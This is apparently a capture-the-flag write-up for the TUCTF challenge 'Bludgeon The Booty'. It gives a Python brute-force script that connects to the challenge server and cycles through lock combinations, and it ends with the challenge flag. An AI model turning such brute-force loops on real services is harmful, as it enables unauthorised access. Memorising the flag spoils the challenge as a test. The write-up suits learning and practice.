# Bludgeon The Booty

Well, you can just try every three-digit number.


```python
from winpwn import *

context.newline = "\n"
context.log_level = 4

p = remote("chal.tuctf.com", 30002)


def recvchest():
    p.recvline()
    p.recvline()
    p.recvline()
    p.recvline()
    p.recvline()
    p.recvline()


recvchest()

for i in range(10000):
    if i:
        if i % 10 == 0:
            p.sendline("1")
            p.recvline()
            p.sendline("2")
            p.recvline()
            p.sendline("+")
            recvchest()
        if i % 100 == 0:
            p.sendline("1")
            p.recvline()
            p.sendline("1")
            p.recvline()
            p.sendline("+")
            recvchest()
    p.sendline("1")
    p.recvline()
    p.sendline("3")
    p.recvline()
    p.sendline("+")
    recvchest()
    p.recvline()
```

Then you can get flag **TUCTF{h3R3_1!3_M3_800Ty}**